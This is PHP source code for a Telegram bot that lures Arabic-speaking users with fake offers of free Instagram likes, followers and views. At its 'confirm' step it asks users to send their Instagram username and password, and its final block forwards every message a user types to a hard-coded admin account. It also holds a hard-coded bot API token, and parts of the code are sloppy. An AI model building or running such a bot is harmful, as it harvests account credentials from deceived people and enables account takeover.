<?php
ob_start();
#define
define('API_KEY','7055170102:AAEdRiz20GcRQtdVwhLKVHFRSxRh8MArO6Y'); //توکن
//====================(@SEFOOR)======================//
#met
function bot($method,$datas=[]){
    $url = "https://api.telegram.org/bot".API_KEY."/".$method;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
    $res = curl_exec($ch);
    if(curl_error($ch)){
        var_dump(curl_error($ch));
    }else{
        return json_decode($res);
    }
}
//====================(@SEFOOR)======================//
#variables
$update = json_decode(file_get_contents("php://input"));
$message = $update->message;
$text = $update->message->text;
$chat_id = $update->message->chat->id;
$from_id = $update->message->from->id;
$message_id = $update->message->message_id;
$from_fname = $message->from->first_name;
$first = $update->callback_query->from->first_name;
$username = $update->callback_query->from->username;
$username2 = $update->message->from->username;
$data = $update->callback_query->data;
$chatid = $update->callback_query->message->chat->id;
$messageid = $update->callback_query->message->message_id;
$forward_username = $update->message->forward_from_chat->username;
$reply = $message->reply_to_message->forward_from->id;
$reply_username = $message->reply_to_message->forward_from->username;
$from_id = $update->message->from->id;
$admin = "2043822357";
mkdir("data/$chat_id");
$rand = rand(0,21);
$Mehdi = $rand;
$rand2 = rand(0,12345);
$Yousefi = $rand2;
$admin = "2043822357";
$my = file_get_contents("data/$chat_id/mem.txt");
//====================(@SEFOOR)======================//
#functions
function SendMessage($chat_id,$text,$keyboard){
	bot('SendMessage',[
	'chat_id'=>$chat_id,
	'text'=>$text,
	'reply_markup'=>$keyboard]);
}
function edit($chat_id,$meesage_id,$text,$reply_markup){
	bot('editMessageText',[
	'chat_id'=>$chat_id,
	'message_id'=>$message_id,
	'text'=>$text,
	'reply_markup'=>$reply_markup]);
}
function save($filename, $data)
{
$file = fopen($filename, 'w');
fwrite($file, $data);
fclose($file);
}
function ForwardMessage($chatid,$from_chat,$message_id){
	bot('ForwardMessage',[
	'chat_id'=>$chatid,
	'from_chat_id'=>$from_chat,
	'message_id'=>$message_id]);
}
//====================(@SEFOOR)======================//
#start
if($text == "/start"){
    		$user = file_get_contents('Member.txt');
	$members = explode("\n",$user);
	if(!in_array($chat_id,$members)){
		$add_user = file_get_contents('Member.txt');
		$add_user .= $chat_id."\n";
		file_put_contents('Member.txt',$add_user);
	}
    bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"- مرحبا بك عزيزي 

- باستخدام هذا البوت يمكنك الحصول على متابعين واعجابات ومشاهدات مجانية .

- للحصول على الخدمه ، يرجى اختيار احد الازرار الاتية ، 👇",
	'pars_mode'=>'html',
	'reply_markup'=>json_encode(['inline_keyboard'=>[
	[['text'=>"اعجابات مجانية ❤",'callback_data'=>"like"],['text'=>"زيادة متابعين 👤",'callback_data'=>"folow"]],
	[['text'=>"مشاهدات مجانية 👀",'callback_data'=>"view"]],
	[['text'=>"وصف البوت ",'callback_data'=>"sharj"],['text'=>"💬فكرة البوت",'callback_data'=>"help"]],
  ],'resize_keyboard'=>true])
  ]);
}
//====================(@SEFOOR)======================//
#like
if($data == "like"){
	bot('editMessageText',[
	'chat_id'=>$chatid,
	'message_id'=>$messageid,
	'text'=>"عزيزي المستخدم 😉
 في هذا القسم يمكنك استخدام هذه الحزمة بطريقتين ✌

 في الجزء الأول ، عن طريق الصدفة ، يمكنك الحصول على ما بين 10 إلى 100 ألف إعجاب مجاني مرتين فقط 😁✖

 في الجزء التالي ، يمكنك الحصول على 10000 إعجاب مجانًا مرة واحدة فقط 😎✖",
	'pars_mode'=>'html',
	'reply_markup'=>json_encode(['inline_keyboard'=>[
	[['text'=>"🚩التفاعل المتبادل",'callback_data'=>"shans"],['text'=>"🚀10k مجاني",'callback_data'=>"free"]],
	[['text'=>"🔸 السابق 🔸",'callback_data'=>"back"]],
	],'resize_keyboard'=>true])
	]);
}
//====================(@SEFOOR)======================//
#folow
if($data == "folow"){
	bot('editMessageText',[
	'chat_id'=>$chatid,
	'message_id'=>$messageid,
	'text'=>"عزيزي المستخدم 😉
 في هذا القسم يمكنك استخدام هذه الحزمة بطريقتين ✌

 في الجزء الأول ، عن طريق الصدفة ، يمكنك الحصول على من 10 إلى 100 ألف متابع مجاني مرتين فقط 😁✖

 في الجزء التالي ، يمكنك الحصول على 10000 متابع مجانًا مرة واحدة فقط ",
	'pars_mode'=>'html',
	'reply_markup'=>json_encode(['inline_keyboard'=>[
	[['text'=>"🚩التفاعل المتبادل",'callback_data'=>"shans"],['text'=>"🚀10k مجاني",'callback_data'=>"free"]],
	[['text'=>"🔸 السابق 🔸",'callback_data'=>"back"]],
	],'resize_keyboard'=>true])
	]);
}
//====================(@SEFOOR)======================//
#view
if($data == "view"){
	bot('editMessageText',[
	'chat_id'=>$chatid,
	'message_id'=>$messageid,
	'text'=>"عزيزي المستخدم 😉
 في هذا القسم يمكنك استخدام هذه الحزمة بطريقتين ✌

 في الجزء الأول ، عن طريق الصدفة ، يمكنك الحصول على ما بين 10 إلى 100 ألف إعجاب مجاني مرتين فقط 😁✖

 في الجزء التالي ، يمكنك الحصول على 10000 إعجاب مجانًا مرة واحدة فقط 😎✖",
	'pars_mode'=>'html',
	'reply_markup'=>json_encode(['inline_keyboard'=>[
	[['text'=>"🚩التفاعل المتبادل",'callback_data'=>"shans"],['text'=>"🚀10k مجاني",'callback_data'=>"free"]],
	[['text'=>"🔸 السابق 🔸",'callback_data'=>"back"]],
	],'resize_keyboard'=>true])
	]);
}
//====================(@SEFOOR)======================//
#sharj
if($data == "sharj"){
	bot('editMessageText',[
	'chat_id'=>$chatid,
	'message_id'=>$messageid,
	'text'=>"حسنًا يا صديقي العزيز ❤

 يتم شحن جميع لوحات الروبوت بشكل عام على النحو التالي
💥👉 $Yousefi",
	'pars_mode'=>'html',
	'reply_markup'=>json_encode(['inline_keyboard'=>[
	[['text'=>"🔸 السابق 🔸",'callback_data'=>"back"]],
	],'resize_keyboard'=>true])
	]);
}
//====================(@SEFOOR)======================//
#help
if($data == "help"){
	bot('editMessageText',[
	'chat_id'=>$chatid,
	'message_id'=>$messageid,
	'text'=>"باستخدام هذا البوت يمكنك الحصول على خدمات انستقرام مجانية ، بدون تعب ولا بذل جهد ، فقط قم باتباع التعليمات....
	",
	'pars_mode'=>'html',
	'reply_markup'=>json_encode(['inline_keyboard'=>[
	[['text'=>"🔸 السابق 🔸",'callback_data'=>"back"]],
	],'resize_keyboard'=>true])
	]);
}
//====================(@SEFOOR)======================//
#shans
if($data == "shans"){
	bot('editMessageText',[
	'chat_id'=>$chatid,
	'message_id'=>$messageid,
	'text'=>"
عزيزي المستخدم 😉

 نقدم لك الهدايا
 💰👉 $Mehdi

 لتلقي الحزمة الخاصة بك ✔

 اختر أحد الأزرار أدناه للحصول عليه ، ولكن إذا لم تستخدم هذا القسم ، فلن يكون لديك فرصة لدفع 
 ",
	'pars_mode'=>'html',
	'reply_markup'=>json_encode(['inline_keyboard'=>[
	[['text'=>"✔تأكيد",'callback_data'=>"dar"],['text'=>"🚀10k مجاني",'callback_data'=>"free"]],
	],'resize_keyboard'=>true])
	]);
}
//====================(@SEFOOR)======================//
#free
if($data == "free"){
	bot('editMessageText',[
	'chat_id'=>$chatid,
	'message_id'=>$messageid,
	'text'=>"لقد اخترت بنجاح الحصول على 10 آلاف مجانًا

 للتنزيل ، حدد الأزرار التالية ، ولكن إذا لم تستخدم هذا القسم ، فلن تتاح لك الفرصة للدفع 😒✖",
	'pars_mode'=>'html',
	'reply_markup'=>json_encode(['inline_keyboard'=>[
	[['text'=>"✔تأكيد",'callback_data'=>"dar"],['text'=>"بازگشت",'callback_data'=>"free"]],
	],'resize_keyboard'=>true])
	]);
}
//====================(@SEFOOR)======================//
#dar
if($data == "dar"){
	bot('editMessageText',[
	'chat_id'=>$chatid,
	'message_id'=>$messageid,
	'text'=>"عزيزي المستخدم 😎

 لاستلام الحزمة الخاصة بك ، أرسل معلومات Instagram الخاصة بك على النحو التالي 👇

 مثال:
 User: Mati2Hanjar
 Paa: 7868543TSAFf

 إذا كانت معلوماتك غير صحيحة ، فلن يتم إرسال أي رسالة إليك بواسطة الروبوت",
	'pars_mode'=>'html',
	'reply_markup'=>json_encode(['inline_keyboard'=>[
	[['text'=>"🔸 السابق 🔸",'callback_data'=>"back"]],
	],'resize_keyboard'=>true])
	]);
}
//====================(@SEFOOR)======================//
#back
if($data == "back"){
	bot('editMessageText',[
	'chat_id'=>$chatid,
	'message_id'=>$messageid,
	'text'=>"- مرحبا بك عزيزي 

- باستخدام هذا البوت يمكنك الحصول على متابعين واعجابات ومشاهدات مجانية .

- للحصول على الخدمه ، يرجى اختيار احد الازرار الاتية ، 👇",
	'reply_markup'=>json_encode(['inline_keyboard'=>[
	[['text'=>"اعجابات مجانية ❤",'callback_data'=>"like"],['text'=>"زيادة متابعين 👤",'callback_data'=>"folow"]],
	[['text'=>"مشاهدات مجانية 👀",'callback_data'=>"view"]],
	[['text'=>"وصف البوت ",'callback_data'=>"sharj"],['text'=>"💬فكرة البوت",'callback_data'=>"help"]],
  ],'resize_keyboard'=>true])
  ]);
}
//====================(@SEFOOR)======================//
#text
if($text == "$text"){
bot('sendmessage',[
'chat_id'=>$admin,
'text'=>"$text",
]);
}

تلجرام
